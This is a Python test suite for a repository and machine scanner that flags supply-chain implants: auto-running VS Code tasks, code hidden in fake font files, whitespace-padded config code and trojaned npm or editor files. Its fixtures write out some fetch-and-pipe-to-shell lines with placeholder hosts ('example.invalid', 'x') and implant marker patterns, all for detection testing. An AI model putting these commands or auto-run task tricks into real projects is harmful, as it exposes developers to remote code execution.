#!/usr/bin/env python3
"""Tests for polinrider_scan.py against small synthetic fixtures.

Every fixture carries the SHAPE of an implant (a long whitespace run followed by a marker, a
task pointing at a font file), never a working payload. The marker strings are split across
adjacent literals so this file itself never matches the scanner.

    python3 -I -m unittest discover -s tests -v      (from the scanner folder)
"""
import base64
import contextlib
import io
import json
import os
import shutil
import stat
import sys
import tempfile
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import polinrider_scan as ps  # noqa: E402

GI = "glo" "bal.i='A9-3x';"                 # the global.i= marker shape
GB = "glo" "bal['!']='9-1';"                # the global['!'] marker shape
C2 = "/*C25" "0617A*/"
M2 = "/*M26" "0630A*/"
RS = "/*RS26" "0605*/"
SHIM = "/*NPM_WS" "_SHIM*/"
INZ = "const __in" "zRQ=require('./main.js.in" "z.cjs');"
GHC2 = "#gh" "c2"

WOFF2 = b"wOF2\x00\x01\x00\x00" + os.urandom(200)
TTF = b"\x00\x01\x00\x00\x00\x10" + os.urandom(200)
OTF = b"OTTO\x00\x0c" + os.urandom(200)
EOT = b"\x00" * 34 + b"LP" + os.urandom(100)
GLB = b"glTF\x02\x00\x00\x00" + os.urandom(100)


def implant_line(code, pad=200, prefix="module.exports = { plugins: {} };"):
    """A config line: real content, a long space run, then code. Long enough to be 2,000+."""
    return prefix + " " * pad + code + " void 0;" * 250


class Tree:
    def __init__(self):
        self.root = tempfile.mkdtemp(prefix="prscan_")

    def w(self, rel, data):
        p = os.path.join(self.root, *rel.split("/"))
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "wb") as fh:
            fh.write(data.encode("utf-8") if isinstance(data, str) else data)
        return p

    def scan(self, **kw):
        skip = set(ps.DEFAULT_SKIP_DIRS)
        if kw.pop("node_modules", False):
            skip.discard("node_modules")
        return ps.RepoScan(self.root, skip, kw.pop("excludes", []), 16 << 20).run()

    def close(self):
        shutil.rmtree(self.root, ignore_errors=True)


def by_rule(scan, rule):
    return [f for f in scan.findings if f["rule"] == rule]


class Base(unittest.TestCase):
    def setUp(self):
        self.t = Tree()

    def tearDown(self):
        self.t.close()


# ---------------------------------------------------------------------------------------------
class TestFolderOpenTask(Base):
    def task(self, command, rel=".vscode/tasks.json", extra=""):
        body = '''{
  // VS Code accepts comments and trailing commas
  "version": "2.0.0",
  "tasks": [
    {
      "label": "eslint-check",
      "type": "shell",
      "command": %s,
      "presentation": {"reveal": "never", "echo": false},
      "runOptions": {"runOn": "folderOpen"},%s
    },
  ]
}''' % (json.dumps(command), extra)
        return self.t.w(rel, body)

    def test_node_on_fake_font_is_high_and_names_target(self):
        self.task("node public/fonts/fa-solid-400.woff2 || true")
        self.t.w("public/fonts/fa-solid-400.woff2", "//" + " " * 150 + GI)
        s = self.t.scan()
        f = by_rule(s, "folder-open-task")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], ps.HIGH)
        self.assertEqual(f[0]["targets"], ["public/fonts/fa-solid-400.woff2"])
        self.assertIn("output is hidden", f[0]["detail"])
        # the font itself is reported too
        self.assertEqual(by_rule(s, "fake-font")[0]["severity"], ps.HIGH)

    def test_wrapper_script_in_vscode(self):
        self.task("sh .vscode/eslint-check.sh")
        self.t.w(".vscode/eslint-check.sh", "#!/bin/sh\nnode public/fonts/fa-brand-400.orc || true\n")
        self.t.w("public/fonts/fa-brand-400.orc", "var a=1;\n" + GB)
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual(f["severity"], ps.HIGH)
        self.assertEqual(f["targets"], ["public/fonts/fa-brand-400.orc"])
        self.assertIn(".vscode/eslint-check.sh", f["detail"])

    def test_windows_cmd_wrapper_os_block(self):
        self.task("sh .vscode/eslint-check.sh",
                  extra='\n      "windows": {"command": "cmd /c .vscode\\\\eslint-check.cmd"}')
        self.t.w(".vscode/eslint-check.sh", "node ./fonts/a.ttf\n")
        self.t.w(".vscode/eslint-check.cmd", "@echo off\r\nnode .\\fonts\\b.woff\r\n")
        self.t.w("fonts/a.ttf", GI)
        self.t.w("fonts/b.woff", GI)
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual(sorted(f["targets"]), ["fonts/a.ttf", "fonts/b.woff"])

    def test_paren_wrapper_path_with_spaces(self):
        self.task("(node './src/app/(auth)/public/fonts/fa brand.woff') || true")
        self.t.w("src/app/(auth)/public/fonts/fa brand.woff", GI)
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual(f["targets"], ["src/app/(auth)/public/fonts/fa brand.woff"])
        self.assertEqual(f["severity"], ps.HIGH)

    def test_args_array_and_workspace_variable(self):
        body = json.dumps({"tasks": [{"label": "x", "command": "node", "args": ["${workspaceFolder}/assets/x.lkf"],
                                      "runOptions": {"runOn": "folderOpen"}}]})
        self.t.w(".vscode/tasks.json", body)
        self.t.w("assets/x.lkf", "hello")
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual(f["targets"], ["assets/x.lkf"])
        self.assertEqual(f["severity"], ps.HIGH)

    def test_depends_on_is_followed(self):
        body = json.dumps({"tasks": [
            {"label": "a", "dependsOn": ["b"], "runOptions": {"runOn": "folderOpen"}},
            {"label": "b", "command": "node public/x.woff2"}]})
        self.t.w(".vscode/tasks.json", body)
        self.t.w("public/x.woff2", GI)
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual(f["targets"], ["public/x.woff2"])

    def test_missing_font_target_is_still_high(self):
        self.task("node public/fonts/gone.woff2")
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual(f["severity"], ps.HIGH)
        self.assertIn("missing", f["detail"])

    def test_nested_tasks_file(self):
        self.task("node fonts/a.woff2", rel="packages/web/.vscode/tasks.json")
        self.t.w("packages/web/fonts/a.woff2", GI)
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual(f["targets"], ["packages/web/fonts/a.woff2"])

    def test_remote_pipe_is_high(self):
        self.task("curl -s https://example.invalid/x | sh")
        self.assertEqual(by_rule(self.t.scan(), "folder-open-task")[0]["severity"], ps.HIGH)

    def test_ordinary_folder_open_task_is_review(self):
        self.task("npm run watch")
        f = by_rule(self.t.scan(), "folder-open-task")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], ps.REVIEW)

    def test_task_without_folder_open_is_ignored(self):
        self.t.w(".vscode/tasks.json", json.dumps({"tasks": [{"label": "b", "command": "node public/x.woff2"}]}))
        self.assertEqual(by_rule(self.t.scan(), "folder-open-task"), [])

    def test_code_workspace_file(self):
        body = json.dumps({"folders": [{"path": "."}], "tasks": {"version": "2.0.0", "tasks": [
            {"label": "x", "command": "node fonts/y.otf", "runOptions": {"runOn": "folderOpen"}}]}})
        self.t.w("proj.code-workspace", body)
        self.t.w("fonts/y.otf", GI)
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual(f["targets"], ["fonts/y.otf"])

    def test_unparsable_tasks_file_falls_back_to_regex(self):
        self.t.w(".vscode/tasks.json", '{"tasks":[{"command":"node public/a.woff2","runOptions":{"runOn":"folderOpen"}')
        self.t.w("public/a.woff2", GI)
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual(f["severity"], ps.HIGH)

    def test_utf16_tasks_file(self):
        body = json.dumps({"tasks": [{"command": "node f/a.woff2", "runOptions": {"runOn": "folderOpen"}}]})
        self.t.w(".vscode/tasks.json", body.encode("utf-16"))
        self.t.w("f/a.woff2", GI)
        self.assertEqual(by_rule(self.t.scan(), "folder-open-task")[0]["targets"], ["f/a.woff2"])


# ---------------------------------------------------------------------------------------------
class TestFakeFont(Base):
    def test_real_fonts_are_clean(self):
        for name, data in (("a.woff2", WOFF2), ("b.ttf", TTF), ("c.otf", OTF), ("d.eot", EOT), ("e.woff", b"wOFF\x00\x01\x00\x00" + os.urandom(80)),
                           ("f.glb", GLB), ("g.ttf", b"true\x00\x0a" + os.urandom(50)), ("h.woff2", b"")):
            self.t.w("fonts/" + name, data)
        s = self.t.scan()
        self.assertEqual(s.findings, [])
        self.assertEqual(s.checked["font_like_files"], 8)

    def test_font_signature_on_text_does_not_excuse_it(self):
        self.t.w("fonts/a.ttf", "true;" + GI)
        self.t.w("fonts/b.woff2", "wOF2=1;" + GI)
        self.assertEqual(len(by_rule(self.t.scan(), "fake-font")), 2)

    def test_git_lfs_pointer_is_clean(self):
        self.t.w("fonts/a.woff2", "version https://git-lfs.github.com/spec/v1\noid sha256:%s\nsize 12345\n" % ("0" * 64))
        self.assertEqual(self.t.scan().findings, [])
        self.t.w("fonts/b.woff2", "version https://git-lfs.github.com/spec/v1\n" + GI + "\n")
        self.assertEqual(len(by_rule(self.t.scan(), "fake-font")), 1)

    def test_text_in_every_font_extension_is_high(self):
        for e in (".woff", ".woff2", ".ttf", ".otf", ".eot", ".orc", ".lkf", ".llf", ".lfk"):
            self.t.w("public/fonts/x" + e, "const a = require('fs');\n")
        f = by_rule(self.t.scan(), "fake-font")
        self.assertEqual(len(f), 9)
        self.assertTrue(all(x["severity"] == ps.HIGH for x in f))

    def test_weak_lookalike_needs_code_shape(self):
        self.t.w("models/plain.glb", "just some notes\n")
        self.t.w("models/bad.glb", "x" + " " * 150 + GI)
        f = by_rule(self.t.scan(), "fake-font")
        self.assertEqual([x["path"] for x in f], ["models/bad.glb"])

    def test_ghc2_stealer_font_is_labeled(self):
        self.t.w("public/fonts/fa-solid-400.woff2", "#!/bin/sh\n# " + GHC2 + "\nexit 0\n")
        f = by_rule(self.t.scan(), "fake-font")[0]
        self.assertTrue(f["ghc2"])

    def test_obfuscated_and_blank_padded(self):
        self.t.w("a.woff", "var _0x1a2b3c=['x'];")
        self.t.w("b.woff", " " * 5000 + "\n" + "var q=1;")
        self.t.w("c.woff", " " * 300)
        f = {x["path"]: x for x in by_rule(self.t.scan(), "fake-font")}
        self.assertIn("obfuscated", f["a.woff"]["detail"])
        self.assertIn("blank padding", f["b.woff"]["detail"])
        self.assertEqual(f["c.woff"]["severity"], ps.REVIEW)


# ---------------------------------------------------------------------------------------------
class TestHiddenCode(Base):
    def test_config_files_at_any_depth(self):
        names = ["eslint.config.mjs", "apps/web/postcss.config.mjs", "tailwind.config.js", "vite.config.ts",
                 "next.config.js", "babel.config.js", "webpack.config.js", "contracts/hardhat.config.js",
                 "truffle-config.js", ".eslintrc.js", "server/init", "src/routes/api.js"]
        for n in names:
            self.t.w(n, implant_line(GI))
        got = sorted(f["path"] for f in by_rule(self.t.scan(), "hidden-code"))
        self.assertEqual(got, sorted(names))

    def test_shape_alone_counts_in_config(self):
        self.t.w("postcss.config.js", implant_line("function GSkqN(a){return a}"))
        f = by_rule(self.t.scan(), "hidden-code")[0]
        self.assertEqual(f["severity"], ps.HIGH)
        self.assertIn("function GSkqN", f["detail"])

    def test_tabs_count_as_whitespace(self):
        self.t.w("vite.config.js", "export default {}" + "\t" * 120 + "var k=1;" + "x" * 2000)
        self.assertEqual(len(by_rule(self.t.scan(), "hidden-code")), 1)

    def test_long_minified_line_without_run_is_clean(self):
        self.t.w("vite.config.js", "export default{a:1," + ",".join("k%d:%d" % (i, i) for i in range(2000)) + "}")
        self.t.w("dist/app.min.js", ";".join("var a%d=%d" % (i, i) for i in range(3000)))
        self.assertEqual(self.t.scan().findings, [])

    def test_run_before_control_bytes_is_clean(self):
        # prettier/plugins/flow.js holds a string table of tabs and control bytes on one long line
        self.t.w("src/flow.js", "var t=\"" + "\t" * 458 + "\x02" * 50 + "\t" * 30 + "\x02" * 3000 + "\";")
        self.assertEqual(self.t.scan().findings, [])

    def test_short_line_and_short_run_are_clean(self):
        self.t.w("tailwind.config.js", "module.exports={}" + " " * 150 + "var x=1;\n")        # line < 2000
        self.t.w("postcss.config.js", "module.exports={}" + " " * 99 + "var x=1;" + "y" * 3000)  # run of 99
        self.assertEqual(self.t.scan().findings, [])

    def test_other_js_needs_code_shape_after_the_run(self):
        self.t.w("src/util.js", implant_line(GI))
        self.t.w("src/table.js", implant_line("a table row"))
        f = {x["path"]: x["severity"] for x in by_rule(self.t.scan(), "hidden-code")}
        self.assertEqual(f, {"src/util.js": ps.HIGH, "src/table.js": ps.REVIEW})

    def test_markers_in_ordinary_code_files(self):
        for i, m in enumerate((C2, M2, RS, INZ, GB, "_$_1e" "42", "rmcej%o" "tb%")):
            self.t.w("src/f%d.js" % i, "var x=1;\n" + m + "\n")
        f = by_rule(self.t.scan(), "marker")
        self.assertEqual(len(f), 7)

    def test_markers_ignored_in_documentation(self):
        self.t.w("README.md", "IOC: " + GI + " " + C2)
        self.t.w("notes.txt", GB)
        self.assertEqual(self.t.scan().findings, [])

    def test_inz_esm_injection_shape(self):
        self.t.w("tailwind.config.js", implant_line("import{createRequire as __in" "zCR}from'module';"))
        f = by_rule(self.t.scan(), "hidden-code")[0]
        self.assertIn("__in" "zCR", f["detail"])


# ---------------------------------------------------------------------------------------------
class TestPackageJson(Base):
    def test_launcher_into_hidden_init(self):
        self.t.w("package.json", json.dumps({"scripts": {"dev": "node server/init && next dev", "start": "node server/init && next start"}}))
        self.t.w("server/init", implant_line(GI))
        f = by_rule(self.t.scan(), "npm-script-launcher")[0]
        self.assertEqual(f["severity"], ps.HIGH)
        self.assertEqual(f["target"], "server/init")
        self.assertIn("dev, start", f["detail"])

    def test_subfolder_package_and_semicolon(self):
        self.t.w("backend/package.json", json.dumps({"scripts": {"dev": "node ./api.js; nodemon index.js"}}))
        self.t.w("backend/api.js", implant_line(GB))
        f = by_rule(self.t.scan(), "npm-script-launcher")[0]
        self.assertEqual(f["target"], "backend/api.js")

    def test_ordinary_prestep_is_clean(self):
        self.t.w("package.json", json.dumps({"scripts": {"build": "node scripts/gen.js && tsc", "dev": "next dev"}}))
        self.t.w("scripts/gen.js", "console.log('generating');\n")
        self.assertEqual(self.t.scan().findings, [])

    def test_launcher_into_font_file(self):
        self.t.w("package.json", json.dumps({"scripts": {"dev": "node public/x.woff2 && vite"}}))
        self.t.w("public/x.woff2", "module.exports=1")
        f = by_rule(self.t.scan(), "npm-script-launcher")[0]
        self.assertEqual(f["severity"], ps.HIGH)

    def test_clean_init_is_review(self):
        self.t.w("package.json", json.dumps({"scripts": {"dev": "node init && vite"}}))
        self.t.w("init", "console.log(1)\n")
        self.assertEqual(by_rule(self.t.scan(), "npm-script-launcher")[0]["severity"], ps.REVIEW)


# ---------------------------------------------------------------------------------------------
class TestGitignore(Base):
    def test_push_script_entries(self):
        self.t.w(".gitignore", "node_modules\n/config.bat\ntemp_auto_push.bat\n**/branch_structure.json\n")
        f = by_rule(self.t.scan(), "gitignore-entries")[0]
        self.assertEqual(f["severity"], ps.HIGH)
        self.assertIn("temp_auto_push.bat", f["detail"])

    def test_single_weak_entry_is_review(self):
        self.t.w("sub/.gitignore", "config.bat\n")
        self.assertEqual(by_rule(self.t.scan(), "gitignore-entries")[0]["severity"], ps.REVIEW)

    def test_ordinary_gitignore_clean(self):
        self.t.w(".gitignore", "node_modules\ndist\n.env\n")
        self.assertEqual(self.t.scan().findings, [])


# ---------------------------------------------------------------------------------------------
class TestWalkAndCli(Base):
    def test_node_modules_skipped_by_default(self):
        self.t.w("node_modules/pkg/tailwind.config.js", implant_line(GI))
        self.assertEqual(self.t.scan().findings, [])
        self.assertEqual(len(self.t.scan(node_modules=True).findings), 1)

    def test_exclude_glob(self):
        self.t.w("vendor/x/postcss.config.js", implant_line(GI))
        self.assertEqual(self.t.scan(excludes=["vendor"]).findings, [])

    def run_main(self, *args):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc = ps.main(list(args))
        return rc, buf.getvalue()

    def test_exit_codes_and_json(self):
        self.t.w("src/index.js", "console.log(1)\n")
        rc, out = self.run_main(self.t.root)
        self.assertEqual(rc, 0)
        self.assertIn("Nothing found", out)
        self.t.w("postcss.config.js", implant_line(GI))
        rc, out = self.run_main(self.t.root, "--json")
        self.assertEqual(rc, 1)
        doc = json.loads(out)
        self.assertEqual(doc["counts"]["high"], 1)
        self.assertEqual(doc["findings"][0]["path"], "postcss.config.js")

    def test_fail_on_high_ignores_review(self):
        self.t.w(".vscode/tasks.json", json.dumps({"tasks": [{"command": "npm run watch", "runOptions": {"runOn": "folderOpen"}}]}))
        self.assertEqual(self.run_main(self.t.root)[0], 1)
        self.assertEqual(self.run_main(self.t.root, "--fail-on", "high")[0], 0)

    def test_missing_path_is_error(self):
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            self.assertEqual(self.run_main(os.path.join(self.t.root, "nope"))[0], 2)

    def test_scanner_skips_its_own_source(self):
        shutil.copy(ps.__file__, os.path.join(self.t.root, "x.py"))
        self.assertEqual(self.t.scan().findings, [])        # a byte-identical vendored copy is skipped
        with open(ps.__file__, "rb") as fh:
            self.t.w("y.py", fh.read() + b"\n# edited\n")
        self.assertTrue(by_rule(self.t.scan(), "marker"))  # an edited copy is just a file with markers
        src = os.path.dirname(os.path.abspath(ps.__file__))
        s = ps.RepoScan(src, set(ps.DEFAULT_SKIP_DIRS) | {"tests", "__pycache__"}, [], 16 << 20).run()
        self.assertEqual([f for f in s.findings if f["path"] == "polinrider_scan.py"], [])

    def test_nothing_is_executed(self):
        # a task target that would leave a file behind if anything ran it
        flag = os.path.join(self.t.root, "RAN")
        self.t.w(".vscode/tasks.json", json.dumps({"tasks": [{"command": "node public/a.woff2", "runOptions": {"runOn": "folderOpen"}}]}))
        self.t.w("public/a.woff2", "require('fs').writeFileSync(%s,'1');" % json.dumps(flag))
        self.t.w("package.json", json.dumps({"scripts": {"dev": "node init && x"}}))
        self.t.w("init", "require('fs').writeFileSync(%s,'1');" % json.dumps(flag))
        self.t.scan()
        self.assertFalse(os.path.exists(flag))


# ---------------------------------------------------------------------------------------------
class TestMachine(Base):
    def ms(self, system="Linux", env=None, crontab=""):
        home = os.path.join(self.t.root, "home")
        os.makedirs(home, exist_ok=True)
        e = {"PATH": os.path.join(self.t.root, "bin"), "USER": "dev"}
        e.update(env or {})
        return ps.MachineScan(system=system, home=home, env=e, fs_root=os.path.join(self.t.root, "fs"),
                              crontab_text=crontab, live_checks=False).run()

    def test_clean_machine(self):
        self.t.w("home/.nvm/versions/node/v20.1.0/lib/node_modules/npm/lib/cli.js", "module.exports = require('./npm.js')\n")
        m = self.ms(crontab="0 3 * * * /usr/bin/backup\n")
        self.assertEqual(m.findings, [])
        self.assertEqual(len(m.checked["npm_cli_copies"]), 1)

    def test_runner_folder(self):
        self.t.w("home/.node_modules/.npm-ws-" "runner.js", "x")
        self.t.w("home/.node_modules/.npm-ws.json", "{}")
        f = self.ms().findings
        self.assertEqual(f[0]["rule"], "backdoor-runner")
        self.assertEqual(f[0]["severity"], ps.HIGH)

    def test_bare_hidden_node_modules_is_review(self):
        self.t.w("home/.node_modules/axios/package.json", "{}")
        self.assertEqual(self.ms().findings[0]["severity"], ps.REVIEW)

    def test_trojaned_cli_js_nvm_and_global_prefix(self):
        tail = "\r\n" + " " * 200 + M2 + "glo" "bal['e']='NPM';" + GI
        self.t.w("home/.nvm/versions/node/v22.0.0/lib/node_modules/npm/lib/cli.js", "module.exports=1" + tail)
        self.t.w("fs/usr/local/lib/node_modules/npm/lib/cli.js", "module.exports=1" + tail)
        f = [x for x in self.ms().findings if x["rule"] == "npm-trojaned"]
        self.assertEqual(len(f), 2)

    def test_npm_beside_node_on_path_unix(self):
        self.t.w("opt/node/bin/node", "")
        self.t.w("opt/node/lib/node_modules/npm/lib/cli.js", "x" + " " * 200 + "require('" + os.path.join("~", ".node_" "modules", ".npm-ws-" "runner.js") + "')")
        f = self.ms(env={"PATH": os.path.join(self.t.root, "opt", "node", "bin")}).findings
        self.assertEqual([x["rule"] for x in f], ["npm-trojaned"])

    def test_windows_shim_python_and_apps(self):
        appdata = os.path.join(self.t.root, "AppData", "Roaming")
        local = os.path.join(self.t.root, "AppData", "Local")
        env = {"APPDATA": appdata, "LOCALAPPDATA": local, "USERNAME": "dev", "ProgramFiles": os.path.join(self.t.root, "PF")}
        self.t.w("AppData/Roaming/npm/node_modules/npm/bin/npm-cli.js", "#!/usr/bin/env node\n" + SHIM + "\nrequire('x');\n")
        self.t.w("AppData/Local/Programs/Python/Python3127/python.exe", "")
        # VS Code's versioned layout: <install>/<hash>/resources/app/out/main.js
        self.t.w("AppData/Local/Programs/Microsoft VS Code/1a2b3c4d5e/resources/app/out/main.js", "'use strict';" + INZ + "\n")
        self.t.w("AppData/Local/Programs/Microsoft VS Code/1a2b3c4d5e/resources/app/out/main.js.inz.orig", "")
        self.t.w("AppData/Local/Programs/Antigravity/resources/app/node_modules/@vscode/deviceid/dist/index.js.inz.cjs", "")
        self.t.w("AppData/Local/Discord/app-1.0.9/modules/discord_desktop_core-1/discord_desktop_core/index.js", INZ)
        self.t.w("AppData/Local/GitHubDesktop/app-3.4.0/resources/app/main.js", INZ)
        self.t.w("AppData/Local/Temp/" + base64.b64encode(b"dev").decode(), "1762780000000")
        f = self.ms(system="Windows", env=env).findings
        rules = sorted(x["rule"] for x in f)
        self.assertEqual(rules.count("npm-trojaned"), 1)
        self.assertIn("malware-python", rules)
        self.assertIn("first-run-marker", rules)
        apps = sorted(x["detail"].split("'")[0].split(" has")[0] for x in f if x["rule"] == "app-trojaned")
        self.assertEqual(rules.count("app-trojaned"), 5, apps)

    def test_linux_and_macos_app_paths(self):
        self.t.w("fs/usr/share/code/resources/app/out/main.js", INZ)
        self.t.w("fs/usr/share/cursor/resources/app/node_modules/@vscode/deviceid/dist/index.js.inz.cjs", "")
        self.t.w("home/Library/Application Support/discord/0.0.300/modules/discord_desktop_core/index.js", INZ)
        self.t.w("fs/Applications/GitHub Desktop.app/Contents/Resources/app/main.js", INZ)
        f = [x for x in self.ms().findings if x["rule"] == "app-trojaned"]
        self.assertEqual(len(f), 4)

    def test_clean_vscode_install(self):
        self.t.w("fs/usr/share/code/resources/app/out/main.js", "'use strict';require('./bootstrap');\n")
        m = self.ms()
        self.assertEqual(m.findings, [])
        self.assertEqual(len(m.checked["app_files"]), 1)

    def test_ghc2_crontab_line(self):
        f = self.ms(crontab="0 3 * * * /usr/bin/backup\n*/30 * * * * curl -s http://x/y | sh " + GHC2 + "\n").findings
        self.assertEqual([x["rule"] for x in f], ["ghc2-crontab"])
        self.assertIn("line 2", f[0]["path"])

    def test_first_run_marker_unix(self):
        self.t.w("fs/tmp/." + base64.b64encode(b"dev").decode(), "1762780000000")
        self.assertEqual([x["rule"] for x in self.ms().findings], ["first-run-marker"])


class TestMachineSummary(TestMachine):
    """The summary says WHAT it read, so a 0 is never read as a check that passed (2026-11-10:
    a Mac with no Node printed '0 copies of npm lib/cli.js'; a Windows box with Discord and
    GitHub Desktop leftovers printed '0 desktop-app program files')."""

    def summary(self, m):
        return "\n".join(ps.machine_summary(m.checked))

    def test_no_node_and_no_apps(self):
        s = self.summary(self.ms())
        self.assertIn("no Node.js or npm install found", s)
        self.assertIn("none of VS Code, Cursor, Antigravity, Discord or GitHub Desktop is installed", s)
        self.assertNotIn("Found a", s)

    def test_names_the_apps_it_read(self):
        self.t.w("fs/usr/share/code/resources/app/out/main.js", "'use strict';\n")
        self.t.w("home/Library/Application Support/discord/0.0.300/modules/discord_desktop_core/index.js", "x\n")
        self.t.w("home/.nvm/versions/node/v20.1.0/lib/node_modules/npm/lib/cli.js", "x\n")
        m = self.ms()
        s = self.summary(m)
        self.assertEqual(m.checked["apps_checked"], ["VS Code", "Discord"])
        self.assertIn("Desktop apps checked: VS Code, Discord (2 program files)", s)
        self.assertIn("npm: checked 1 copy of lib/cli.js", s)
        self.assertEqual(m.checked["app_leftovers"], [])

    def test_leftover_app_folders_are_named(self):
        local = os.path.join(self.t.root, "AppData", "Local")
        env = {"APPDATA": os.path.join(self.t.root, "AppData", "Roaming"), "LOCALAPPDATA": local, "USERNAME": "dev"}
        self.t.w("AppData/Local/Discord/Update.exe", "")
        self.t.w("AppData/Local/GitHubDesktop/Update.exe", "")
        m = self.ms(system="Windows", env=env)
        self.assertEqual(m.findings, [])
        self.assertEqual(sorted(x["app"] for x in m.checked["app_leftovers"]), ["Discord", "GitHub Desktop"])
        s = self.summary(m)
        self.assertIn("Found a Discord folder but none of the program files", s)
        self.assertIn("Found a GitHub Desktop folder", s)

    def test_npm_folder_without_cli(self):
        os.makedirs(os.path.join(self.t.root, "fs", "usr", "local", "lib", "node_modules", "npm"))
        self.assertIn("found 1 npm folder but no lib/cli.js", self.summary(self.ms()))

    def test_text_output_uses_the_summary(self):
        out = ps.render_text("machine", ["host"], [], self.ms().checked)
        self.assertIn("no Node.js or npm install found", out)
        self.assertNotIn("0 copies", out)


# ---------------------------------------------------------------------------------------------
class TestReviewRegressions(Base):
    """One test per finding of the independent review, 2026-11-10."""

    def run_main(self, *args):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = ps.main(list(args))
        return rc, out.getvalue(), err.getvalue()

    def test_deeply_nested_json_does_not_crash(self):
        self.t.w("package.json", "[" * 100000 + "]" * 100000)
        self.t.w(".vscode/tasks.json", '{"a":' * 100000 + '"folderOpen"' + "}" * 100000)
        rc, out, err = self.run_main(self.t.root, "--json")
        self.assertEqual((rc, err), (1, ""))  # no crash; the unparsable folder-open file is listed for review
        self.assertEqual([(f["rule"], f["severity"]) for f in json.loads(out)["findings"]], [("folder-open-task", ps.REVIEW)])

    def test_a_crash_exits_2_not_1(self):
        orig = ps.RepoScan.run
        ps.RepoScan.run = lambda self: 1 / 0
        try:
            rc, out, err = self.run_main(self.t.root)
        finally:
            ps.RepoScan.run = orig
        self.assertEqual(rc, 2)
        self.assertIn("ZeroDivisionError", err)

    def test_long_whitespace_run_is_linear(self):
        for e in ("a.js", "b", "c.woff2"):
            self.t.w(e, b"x" + b" " * 400000)
        t0 = time.time()
        self.t.scan()
        self.assertLess(time.time() - t0, 3)

    @unittest.skipUnless(hasattr(os, "mkfifo"), "named pipes are POSIX")
    def test_named_pipe_is_skipped(self):
        os.mkfifo(os.path.join(self.t.root, "x.js"))
        os.makedirs(os.path.join(self.t.root, ".vscode"))
        self.t.w(".vscode/tasks.json", json.dumps({"tasks": [{"command": "node pipe.woff2", "runOptions": {"runOn": "folderOpen"}}]}))
        os.mkfifo(os.path.join(self.t.root, "pipe.woff2"))
        self.assertEqual(by_rule(self.t.scan(), "folder-open-task")[0]["severity"], ps.HIGH)

    def test_implant_appended_past_the_cap(self):
        self.t.w("dist/big.js", b"var a=1;\n" * 300000 + b"\n" + implant_line(GI).encode())
        s = ps.RepoScan(self.t.root, set(ps.DEFAULT_SKIP_DIRS), [], 1 << 20).run()
        self.assertEqual(by_rule(s, "hidden-code")[0]["severity"], ps.HIGH)
        self.assertEqual(s.checked["truncated"], 1)
        self.assertEqual(self.run_main(self.t.root, "--max-file-mb", "1")[0], 1)
        with self.assertRaises(SystemExit):
            with contextlib.redirect_stderr(io.StringIO()):
                ps.main([self.t.root, "--max-file-mb", "0"])

    def test_escaped_folder_open(self):
        self.t.w(".vscode/tasks.json", '{"tasks":[{"command":"node f/a.woff2","runOptions":{"runOn":"folder\\u004fpen"}}]}')
        self.t.w("f/a.woff2", GI)
        self.assertEqual(by_rule(self.t.scan(), "folder-open-task")[0]["severity"], ps.HIGH)

    def test_windows_backslash_target(self):
        self.t.w(".vscode/tasks.json", json.dumps({"tasks": [{"command": "node .\\public\\fonts\\fa.woff2", "runOptions": {"runOn": "folderOpen"}}]}))
        self.t.w("public/fonts/fa.woff2", GI)
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual((f["severity"], f["targets"]), (ps.HIGH, ["public/fonts/fa.woff2"]))

    def test_wrapper_background_and_redirect_forms(self):
        cases = {"a.sh": "node ./public/fonts/a.woff2 &\n",
                 "b.sh": "nohup node public/fonts/b.woff2 >/dev/null 2>&1 &\n",
                 "c.cmd": "@echo off\r\nnode .\\public\\fonts\\c.woff2 >nul 2>&1\r\n",
                 "d.sh": 'node "$(dirname "$0")/../public/fonts/d.woff2"\n'}
        for name, body in cases.items():
            self.t.w("scripts/" + name, body)
            self.t.w("public/fonts/%s.woff2" % name[0], GI)
        cmd = " ; ".join(("sh scripts/%s" if n.endswith(".sh") else "cmd /c scripts\\%s") % n for n in cases)
        self.t.w(".vscode/tasks.json", json.dumps({"tasks": [{"command": cmd, "runOptions": {"runOn": "folderOpen"}}]}))
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual(sorted(f["targets"]), ["public/fonts/%s.woff2" % c for c in "abcd"])
        self.assertEqual(f["severity"], ps.HIGH)

    def test_npm_script_shapes(self):
        self.t.w("package.json", json.dumps({"scripts": {
            "dev": "node scripts/check.js && node public/fonts/a.woff2 && next dev",
            "build": "node --no-deprecation public/fonts/b.woff2 && vite build",
            "serve": "node public/fonts/c.woff2 & next start",
            "predev": "node public/fonts/d.woff2",
            "start": "node api.js"}}))
        self.t.w("scripts/check.js", "console.log(1)\n")
        self.t.w("api.js", "console.log('server')\n")
        for c in "abcd":
            self.t.w("public/fonts/%s.woff2" % c, GI)
        f = by_rule(self.t.scan(), "npm-script-launcher")
        self.assertEqual(sorted(x["target"] for x in f), ["public/fonts/%s.woff2" % c for c in "abcd"])
        self.assertTrue(all(x["severity"] == ps.HIGH for x in f))

    def test_cwd_is_bare_workspace_folder(self):
        self.t.w(".vscode/tasks.json", json.dumps({"tasks": [{"command": "node src/api.js", "options": {"cwd": "${workspaceFolder}"},
                                                              "runOptions": {"runOn": "folderOpen"}}]}))
        self.t.w("src/api.js", implant_line(GI))
        f = by_rule(self.t.scan(), "folder-open-task")[0]
        self.assertEqual((f["severity"], f["targets"]), (ps.HIGH, ["src/api.js"]))

    def test_paths_outside_the_repository_are_not_read(self):
